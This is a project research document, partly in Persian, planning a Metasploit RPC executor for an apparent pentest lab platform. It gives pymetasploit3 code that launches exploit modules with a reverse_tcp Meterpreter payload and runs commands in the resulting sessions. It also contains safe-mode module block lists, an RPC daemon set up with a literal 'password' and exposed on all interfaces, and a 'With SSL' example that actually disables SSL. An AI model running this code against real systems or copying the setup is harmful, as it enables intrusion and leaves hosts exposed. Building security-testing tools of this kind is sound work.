# Phase 7.3: MetasploitExecutor Research 🔍

**Status**: Research Phase  
**Priority**: HIGH 🔴  
**Duration**: ~8 hours (estimated)  
**Date**: January 1, 2026

---

## 📋 Overview

Phase 7.3 تحقیق و پیاده‌سازی **MetasploitExecutor** برای اجرای exploitهای Metasploit در Docker container با RPC API و pymetasploit3.

---

## 🎯 Objectives

1. ✅ **msfrpcd Integration**: اتصال به Metasploit RPC daemon
2. ✅ **pymetasploit3 Client**: استفاده از Python library
3. ✅ **Module Search**: جستجوی exploits و auxiliaries
4. ✅ **Exploit Execution**: اجرای exploits با parameters
5. ✅ **Session Management**: مدیریت sessions و shells
6. ✅ **Payload Generation**: تولید payloads
7. ✅ **Real-time Progress**: گزارش progress به Frontend
8. ✅ **Safe Mode**: حالت ایمن برای تست

---

## 🔍 **بخش 1: Metasploit Architecture**

### **A. Metasploit Components**

```
┌──────────────────────────────────────┐
│      Metasploit Framework            │
├──────────────────────────────────────┤
│  ┌────────────────────────────────┐ │
│  │     msfconsole (Console)       │ │
│  └────────────────────────────────┘ │
│  ┌────────────────────────────────┐ │
│  │     msfrpcd (RPC Daemon)       │ │ ← We use this!
│  │  - HTTP/HTTPS server           │ │
│  │  - MessagePack RPC             │ │
│  │  - Authentication token        │ │
│  └────────────────────────────────┘ │
│  ┌────────────────────────────────┐ │
│  │     Modules                    │ │
│  │  - Exploits                    │ │
│  │  - Auxiliary                   │ │
│  │  - Post                        │ │
│  │  - Payloads                    │ │
│  │  - Encoders                    │ │
│  │  - Nops                        │ │
│  └────────────────────────────────┘ │
└──────────────────────────────────────┘
```

### **B. RPC API Architecture**

```
┌──────────────────┐
│  Python Client   │
│ (pymetasploit3)  │
└────────┬─────────┘
         │ HTTP/MessagePack
         ▼
┌──────────────────┐
│    msfrpcd       │
│  (RPC Daemon)    │
│  Port: 55553     │
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│  Metasploit      │
│  Framework       │
└──────────────────┘
```

---

## 🐳 **بخش 2: Docker Integration**

### **A. Docker Image Options**

#### **Option 1: Official Metasploit Image** (RECOMMENDED)
```dockerfile
FROM metasploitframework/metasploit-framework:latest

# Install additional tools
RUN apt-get update && apt-get install -y \
    postgresql-client \
    && rm -rf /var/lib/apt/lists/*

# Start msfrpcd
CMD ["msfrpcd", "-P", "password", "-S", "-a", "0.0.0.0"]
```

**Advantages:**
- ✅ Official and maintained
- ✅ All modules included
- ✅ Regular updates
- ✅ Well-tested

**Image Details:**
- **Name**: `metasploitframework/metasploit-framework`
- **Size**: ~1.5GB
- **Base**: Ubuntu
- **Tags**: `latest`, specific versions

#### **Option 2: Custom Alpine Image** (Lightweight)
```dockerfile
FROM alpine:latest

# Install Metasploit (complex, not recommended)
RUN apk add --no-cache ruby ruby-dev postgresql-dev ...
```

**Disadvantages:**
- ❌ Complex installation
- ❌ Missing dependencies
- ❌ Not officially supported

### **B. Docker Compose Configuration**

```yaml
version: '3.8'

services:
  metasploit:
    image: metasploitframework/metasploit-framework:latest
    container_name: secureredlab_metasploit
    networks:
      - isolated_pentest
    environment:
      - MSF_RPC_PASS=secure_password_here
    command: >
      bash -c "
      msfdb init &&
      msfrpcd -P ${MSF_RPC_PASS} -S -a 0.0.0.0 -p 55553
      "
    ports:
      - "55553:55553"
    volumes:
      - metasploit_data:/root/.msf4
    restart: unless-stopped
    mem_limit: 2g
    cpus: 2.0

volumes:
  metasploit_data:

networks:
  isolated_pentest:
    driver: bridge
```

### **C. Starting msfrpcd**

```bash
# Method 1: Direct command
msfrpcd -P password -S -a 0.0.0.0 -p 55553

# Method 2: With SSL
msfrpcd -P password -S -a 0.0.0.0 -p 55553

# Method 3: With specific database
msfrpcd -P password -S -a 0.0.0.0 -p 55553 -d postgres
```

**Flags:**
- `-P`: Password for authentication
- `-S`: Disable SSL (for local testing)
- `-a`: Listen address (0.0.0.0 for all interfaces)
- `-p`: Port number (default: 55553)
- `-d`: Database driver

---

## 🐍 **بخش 3: pymetasploit3 Integration**

### **A. Installation**

```bash
pip install pymetasploit3==1.0.3
```

### **B. Basic Usage**

```python
from pymetasploit3.msfrpc import MsfRpcClient

# Connect to msfrpcd
client = MsfRpcClient(
    password='password',
    port=55553,
    server='127.0.0.1',
    ssl=False
)

# Check connection
print(client.core.version())  # {'version': '6.x.x', ...}
```

### **C. Module Operations**

#### **1. List Modules**

```python
# List all exploits
exploits = client.modules.exploits

# List all auxiliary modules
auxiliary = client.modules.auxiliary

# List all payloads
payloads = client.modules.payloads
```

#### **2. Search Modules**

```python
# Search for modules
results = client.modules.search('tomcat')

# Output:
# [
#   'exploit/multi/http/tomcat_mgr_upload',
#   'exploit/multi/http/tomcat_jsp_upload_bypass',
#   'auxiliary/scanner/http/tomcat_mgr_login',
#   ...
# ]
```

#### **3. Use Module**

```python
# Load exploit module
exploit = client.modules.use('exploit', 'multi/http/apache_struts2_rest_xstream')

# View required options
print(exploit.required)
# ['RHOSTS', 'RPORT']

# View all options
print(exploit.options)
# {'RHOSTS': {...}, 'RPORT': {...}, ...}
```

#### **4. Set Options**

```python
# Set target
exploit['RHOSTS'] = '192.168.1.100'
exploit['RPORT'] = 8080

# Set payload
exploit['PAYLOAD'] = 'linux/x64/meterpreter/reverse_tcp'
exploit['LHOST'] = '192.168.1.10'
exploit['LPORT'] = 4444
```

#### **5. Execute Exploit**

```python
# Execute exploit
result = exploit.execute()

# Check if successful
if result['job_id']:
    print(f"Exploit running, Job ID: {result['job_id']}")
    
    # Wait for session
    import time
    time.sleep(5)
    
    # Check sessions
    sessions = client.sessions.list
    if sessions:
        print(f"Session created: {sessions}")
```

### **D. Session Management**

```python
# List active sessions
sessions = client.sessions.list
# {
#   '1': {
#       'type': 'meterpreter',
#       'tunnel_local': '192.168.1.10:4444',
#       'tunnel_peer': '192.168.1.100:xxxxx',
#       'via_exploit': 'exploit/multi/http/...',
#       'via_payload': 'linux/x64/meterpreter/reverse_tcp',
#       'desc': 'Meterpreter',
#       'info': 'Linux version...',
#       ...
#   }
# }

# Interact with session
session = client.sessions.session('1')

# Execute command
output = session.write('sysinfo')
print(session.read())

# Stop session
session.stop()
```

### **E. Jobs Management**

```python
# List running jobs
jobs = client.jobs.list
# {
#   '0': {
#       'name': 'Exploit: multi/handler',
#       'start_time': 1234567890
#   }
# }

# Stop job
client.jobs.stop('0')
```

---

## 🎯 **بخش 4: Implementation Strategy**

### **A. MetasploitExecutor Class Structure**

```python
class MetasploitExecutor(BaseExecutor):
    """
    Metasploit exploit executor with RPC integration
    
    Features:
    - Module search and selection
    - Exploit execution
    - Session management
    - Payload generation
    - Safe mode (no actual exploitation)
    """
    
    DOCKER_IMAGE = "metasploitframework/metasploit-framework:latest"
    DEFAULT_RPC_PORT = 55553
    DEFAULT_TIMEOUT = 600  # 10 minutes
```

### **B. Key Methods**

#### **1. Connection Management**

```python
async def _connect_rpc(self, host: str, port: int, password: str):
    """Connect to msfrpcd"""
    try:
        self.client = MsfRpcClient(
            password=password,
            port=port,
            server=host,
            ssl=False
        )
        return True
    except Exception as e:
        self.logger.error(f"RPC connection failed: {e}")
        return False
```

#### **2. Module Search**

```python
async def search_modules(self, query: str, module_type: str = None):
    """
    Search for Metasploit modules
    
    Args:
        query: Search term
        module_type: 'exploit', 'auxiliary', 'post', etc.
    """
    results = self.client.modules.search(query)
    
    if module_type:
        results = [r for r in results if r.startswith(module_type)]
    
    return results
```

#### **3. Exploit Execution**

```python
async def execute_exploit(
    self,
    module: str,
    target: str,
    payload: str = None,
    options: Dict = None
):
    """
    Execute Metasploit exploit
    
    Args:
        module: Exploit module path
        target: Target IP/URL
        payload: Payload to use
        options: Additional options
    """
    # Load module
    exploit = self.client.modules.use('exploit', module)
    
    # Set target
    exploit['RHOSTS'] = target
    
    # Set payload
    if payload:
        exploit['PAYLOAD'] = payload
    
    # Set additional options
    if options:
        for key, value in options.items():
            exploit[key] = value
    
    # Execute
    result = exploit.execute()
    
    return result
```

---

## 🔒 **بخش 5: Security Considerations**

### **A. Safe Mode Implementation**

```python
# Safe mode: Only run auxiliary modules (non-exploitative)
SAFE_MODULES = [
    'auxiliary/scanner/*',
    'auxiliary/gather/*',
    'auxiliary/analyze/*'
]

# Block dangerous modules in safe mode
DANGEROUS_MODULES = [
    'exploit/*',
    'post/multi/manage/*',
    'auxiliary/dos/*'
]
```

### **B. Resource Limits**

```yaml
# Docker constraints
mem_limit: 2g        # 2GB RAM
cpus: 2.0            # 2 CPU cores
pids_limit: 1000     # Max processes
```

### **C. Network Isolation**

```yaml
networks:
  isolated_pentest:
    driver: bridge
    internal: true  # No internet access
```

---

## 📊 **بخش 6: Progress Tracking**

### **Progress Stages:**

```python
PROGRESS_STAGES = {
    "initializing": 5,           # Starting msfrpcd
    "connecting": 10,            # Connecting to RPC
    "searching_module": 15,      # Searching for module
    "loading_module": 20,        # Loading module
    "configuring": 30,           # Setting options
    "executing": 40,             # Running exploit
    "waiting_session": 60,       # Waiting for session
    "session_active": 80,        # Session established
    "collecting_results": 95,    # Gathering output
    "completed": 100             # Done
}
```

---

## 🧪 **بخش 7: Testing Strategy**

### **Test Cases:**

1. ✅ **RPC Connection**: Connect to msfrpcd
2. ✅ **Module Search**: Search for exploits
3. ✅ **Module Loading**: Load exploit module
4. ✅ **Option Setting**: Configure exploit options
5. ✅ **Safe Execution**: Run auxiliary module
6. ✅ **Session Management**: List and interact with sessions
7. ✅ **Error Handling**: Handle connection failures
8. ✅ **Timeout Handling**: Handle long-running exploits
9. ✅ **Safe Mode**: Block dangerous modules
10. ✅ **Progress Tracking**: Report progress updates

---

## 📝 **Next Steps**

1. ✅ Install pymetasploit3
2. ✅ Create MetasploitExecutor class
3. ✅ Implement RPC connection
4. ✅ Implement module operations
5. ✅ Implement safe mode
6. ✅ Add progress tracking
7. ✅ Write tests
8. ✅ Update Celery tasks
9. ✅ Documentation

---

**Ready to start implementation!** 🎯
